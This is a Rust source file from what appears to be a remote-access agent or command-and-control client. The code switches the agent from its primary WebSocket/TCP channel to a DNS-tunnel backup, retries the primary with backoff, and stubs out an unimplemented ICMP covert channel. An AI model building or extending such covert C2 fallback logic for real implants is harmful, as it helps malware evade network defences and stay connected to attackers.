// Client/core/src/fallback.rs
// 🛡️ Phase 3: Fallback Channel Implementation
//
// When primary channel (ws/wss/tcp) disconnects, automatically switch to
// backup channel (DNS tunnel or ICMP) to maintain connectivity.
//
// This prevents total loss of agent when network conditions change.

use crate::config::get_server_url;
use crate::error::{ClientError, Result};
use crate::transport::Transport;
use log::{debug, info, warn};

/// Fallback channel state
#[derive(Debug, Clone, PartialEq)]
pub enum FallbackState {
    Primary,         // Using primary channel (ws/wss/tcp)
    DnsBackup,       // Using DNS tunnel as backup
    WaitingRecovery, // Waiting to reconnect to primary
}

/// Fallback channel manager
pub struct FallbackManager {
    state: FallbackState,
    primary_url: String,
    dns_url: Option<String>,
    recovery_attempts: u32,
    max_recovery_attempts: u32,
}

impl FallbackManager {
    /// Create new fallback manager
    pub fn new() -> Self {
        let primary_url = get_server_url();

        // Extract DNS domain from primary URL if available
        let dns_url = Self::extract_dns_domain(&primary_url);

        Self {
            state: FallbackState::Primary,
            primary_url,
            dns_url,
            recovery_attempts: 0,
            max_recovery_attempts: 5,
        }
    }

    /// Extract DNS domain from WebSocket URL
    fn extract_dns_domain(ws_url: &str) -> Option<String> {
        // Convert ws://example.com:8080/ws to dns://example.com
        let clean_url = ws_url
            .replace("ws://", "")
            .replace("wss://", "")
            .replace("tcp://", "");

        // Extract host part
        let host = clean_url.split('/').next()?;
        let domain = host.split(':').next()?;

        if domain.contains('.') {
            Some(format!("dns://{}", domain))
        } else {
            None
        }
    }

    /// Get current state
    pub fn state(&self) -> &FallbackState {
        &self.state
    }

    /// Switch to fallback channel when primary fails
    pub fn switch_to_fallback(&mut self) -> Option<String> {
        if self.state == FallbackState::Primary {
            info!("[agent] primary channel failed, switching backup");
            // Allow a fresh recovery budget after each primary failure
            self.recovery_attempts = 0;

            if let Some(dns_url) = &self.dns_url {
                #[cfg(feature = "dns")]
                {
                    self.state = FallbackState::DnsBackup;
                    info!("[agent] DNS backup active");
                    return Some(dns_url.clone());
                }

                #[cfg(not(feature = "dns"))]
                {
                    warn!("[agent] DNS backup unavailable");
                    self.state = FallbackState::WaitingRecovery;
                }
            } else {
                warn!("[agent] No DNS backup available, entering recovery mode");
                self.state = FallbackState::WaitingRecovery;
            }
        }
        None
    }

    /// Attempt to recover primary channel
    pub fn attempt_recovery(&mut self) -> Option<String> {
        if self.state == FallbackState::WaitingRecovery || self.state == FallbackState::DnsBackup {
            self.recovery_attempts += 1;

            if self.recovery_attempts <= self.max_recovery_attempts {
                info!(
                    "[agent] Recovery attempt {} of {}",
                    self.recovery_attempts, self.max_recovery_attempts
                );
                Some(self.primary_url.clone())
            } else {
                warn!("[agent] Max recovery attempts reached, staying on backup");
                None
            }
        } else {
            None
        }
    }

    /// Mark primary channel as recovered
    pub fn mark_recovered(&mut self) {
        if self.state != FallbackState::Primary {
            info!("[agent] Primary channel recovered");
            self.state = FallbackState::Primary;
            self.recovery_attempts = 0;
        }
    }

    /// Get delay for recovery attempt
    pub fn recovery_delay_secs(&self) -> u64 {
        // Exponential backoff: 30s, 60s, 120s, 240s, 480s
        let base = 30;
        base * (2u64.pow(self.recovery_attempts.min(4)))
    }

    /// Check if we should attempt recovery
    pub fn should_attempt_recovery(&self) -> bool {
        self.state != FallbackState::Primary && self.recovery_attempts < self.max_recovery_attempts
    }
}

impl Default for FallbackManager {
    fn default() -> Self {
        Self::new()
    }
}

/// 🛡️ Phase 3: ICMP Fallback (Conceptual)
///
/// ICMP echo channel would embed data in ICMP ping packets.
/// This requires raw socket access which may be restricted.
/// Implementation is platform-dependent and requires elevated privileges.
#[cfg(target_os = "linux")]
pub fn try_icmp_fallback(target: &str, data: &[u8]) -> Result<Vec<u8>> {
    // ICMP implementation requires:
    // 1. Raw socket creation (needs root/CAP_NET_RAW)
    // 2. ICMP packet crafting with embedded data
    // 3. Response parsing

    // For now, return error indicating this needs implementation
    Err(ClientError::ConnectionError(
        "ICMP fallback not implemented (requires raw socket access)".to_string(),
    ))
}

#[cfg(target_os = "windows")]
pub fn try_icmp_fallback(_target: &str, _data: &[u8]) -> Result<Vec<u8>> {
    // Windows ICMP via IcmpSendEcho requires:
    // 1. No special privileges for echo requests
    // 2. Data can be embedded in echo request
    // 3. Response parsing

    Err(ClientError::ConnectionError(
        "ICMP fallback not implemented".to_string(),
    ))
}

#[cfg(not(any(target_os = "windows", target_os = "linux")))]
pub fn try_icmp_fallback(_target: &str, _data: &[u8]) -> Result<Vec<u8>> {
    Err(ClientError::ConnectionError(
        "Platform not supported".to_string(),
    ))
}
